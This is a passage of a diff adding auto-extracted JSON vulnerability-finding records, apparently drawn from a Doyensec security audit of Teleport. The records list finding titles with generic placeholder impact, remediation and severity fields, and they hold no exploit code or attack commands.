+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.409Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Cluster IP Leakage Through Round-Robin DNS Abusing",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Cluster IP Leakage Through Round-Robin DNS Abusing affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-3 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "cluster ip leakage through round-robin dns abusing",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-3|cluster ip leakage through round robin dns abusing|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Cluster IP Leakage Through Round-Robin DNS Abusing",
+        "sourceText": "TEL-Q420-3. Cluster IP Leakage Through Round-Robin DNS Abusing",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-005",
+      "slug": "content-spoofing-abusing-error-pages-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "Content Spoofing Abusing Error Pages",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "Content Spoofing Abusing Error Pages affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-4 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.409Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Content Spoofing Abusing Error Pages",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Content Spoofing Abusing Error Pages affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-4 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "content spoofing abusing error pages",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-4|content spoofing abusing error pages|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Content Spoofing Abusing Error Pages",
+        "sourceText": "TEL-Q420-4 Content Spoofing Abusing Error Pages",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-006",
+      "slug": "existence-leak-of-label-restricted-resources-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "Existence Leak of Label-restricted Resources",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "Existence Leak of Label-restricted Resources affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-5 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.410Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Existence Leak of Label-restricted Resources",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Existence Leak of Label-restricted Resources affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-5 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "existence leak of label-restricted resources",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-5|existence leak of label restricted resources|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Existence Leak of Label-restricted Resources",
+        "sourceText": "TEL-Q420-5 Existence Leak of Label-restricted Resources",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-007",
+      "slug": "insecure-default-tlsclientconfig-in-dial-function-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "Insecure Default TLSClientConfig In Dial Function",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "Insecure Default TLSClientConfig In Dial Function affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-6 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.410Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Insecure Default TLSClientConfig In Dial Function",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Insecure Default TLSClientConfig In Dial Function affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-6 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "insecure default tlsclientconfig in dial function",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-6|insecure default tlsclientconfig in dial function|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Insecure Default TLSClientConfig In Dial Function",
+        "sourceText": "TEL-Q420-6 Insecure Default TLSClientConfig In Dial Function",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-008",
+      "slug": "login-crosssite-request-forgery-on-application-access-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "Login CrossSite Request Forgery On Application Access",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "Login CrossSite Request Forgery On Application Access affecting investigation-scope; extractor found type Cross-Site Request Forgery. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-7 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.410Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Login CrossSite Request Forgery On Application Access",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Login CrossSite Request Forgery On Application Access affecting investigation-scope; extractor found type Cross-Site Request Forgery. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-7 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "login crosssite request forgery on application access",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-7|login crosssite request forgery on application access|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Login CrossSite Request Forgery On Application Access",
+        "sourceText": "TEL-Q420-7 Login CrossSite Request Forgery On Application Access",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-009",
+      "slug": "parameter-injection-in-install-app-script-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "Parameter Injection In Install App Script",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "Parameter Injection In Install App Script affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-8 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.410Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Parameter Injection In Install App Script",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Parameter Injection In Install App Script affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-8 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "parameter injection in install app script",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-8|parameter injection in install app script|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Parameter Injection In Install App Script",
+        "sourceText": "TEL-Q420-8 Parameter Injection In Install App Script",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-010",
+      "slug": "missing-applications-session-invalidation-on-parent-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "Missing Applications Session Invalidation On Parent",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "Missing Applications Session Invalidation On Parent affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-9 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.411Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Missing Applications Session Invalidation On Parent",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Missing Applications Session Invalidation On Parent affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-9 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "missing applications session invalidation on parent",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-9|missing applications session invalidation on parent|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Missing Applications Session Invalidation On Parent",
+        "sourceText": "TEL-Q420-9 Missing Applications Session Invalidation On Parent",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-011",
+      "slug": "cli-content-spoofing-through-request-reason-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "CLI Content Spoofing Through Request Reason",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "CLI Content Spoofing Through Request Reason affecting investigation-scope; extractor found security indicators from the submitted report.",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-11",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.411Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "CLI Content Spoofing Through Request Reason",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "CLI Content Spoofing Through Request Reason affecting investigation-scope; extractor found security indicators from the submitted report.",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-11",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "cli content spoofing through request reason",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-11|cli content spoofing through request reason|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "CLI Content Spoofing Through Request Reason",
+        "sourceText": "TEL-Q420-11 CLI Content Spoofing Through Request Reason Medium",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-012",
+      "slug": "aap-headers-injection-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "AAP Headers Injection",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "AAP Headers Injection affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-12 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.412Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "AAP Headers Injection",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "AAP Headers Injection affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-12 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "aap headers injection",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-12|aap headers injection|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "AAP Headers Injection",
+        "sourceText": "TEL-Q420-12 AAP Headers Injection",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-013",
+      "slug": "unprotected-prometheus-diagnostic-endpoint-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "Unprotected Prometheus Diagnostic Endpoint",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "Unprotected Prometheus Diagnostic Endpoint affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-13 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.412Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Unprotected Prometheus Diagnostic Endpoint",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Unprotected Prometheus Diagnostic Endpoint affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-13 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "unprotected prometheus diagnostic endpoint",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-13|unprotected prometheus diagnostic endpoint|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Unprotected Prometheus Diagnostic Endpoint",
+        "sourceText": "TEL-Q420-13 Unprotected Prometheus Diagnostic Endpoint",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-014",
+      "slug": "ca-pinning-does-not-check-certificate-expiration-date-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "CA Pinning Does Not Check Certificate Expiration Date",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "CA Pinning Does Not Check Certificate Expiration Date affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-14 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.412Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "CA Pinning Does Not Check Certificate Expiration Date",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "CA Pinning Does Not Check Certificate Expiration Date affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-14 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "ca pinning does not check certificate expiration date",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-14|ca pinning does not check certificate expiration date|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "CA Pinning Does Not Check Certificate Expiration Date",
+        "sourceText": "TEL-Q420-14 CA Pinning Does Not Check Certificate Expiration Date",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-015",
+      "slug": "unauthenticated-oom-dos-in-readjson-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "Unauthenticated OOM DoS in ReadJSON",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "Unauthenticated OOM DoS in ReadJSON affecting investigation-scope; extractor found type Denial of Service. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-15 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.413Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Unauthenticated OOM DoS in ReadJSON",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Unauthenticated OOM DoS in ReadJSON affecting investigation-scope; extractor found type Denial of Service. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-15 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "unauthenticated oom dos in readjson",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-15|unauthenticated oom dos in readjson|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Unauthenticated OOM DoS in ReadJSON",
+        "sourceText": "TEL-Q420-15 Unauthenticated OOM DoS in ReadJSON",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-016",
+      "slug": "multiple-unhandled-errors-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "Multiple Unhandled Errors",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "Multiple Unhandled Errors affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-16 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.413Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Multiple Unhandled Errors",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Multiple Unhandled Errors affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-16 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "multiple unhandled errors",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-16|multiple unhandled errors|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Multiple Unhandled Errors",
+        "sourceText": "TEL-Q420-16 Multiple Unhandled Errors",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-017",
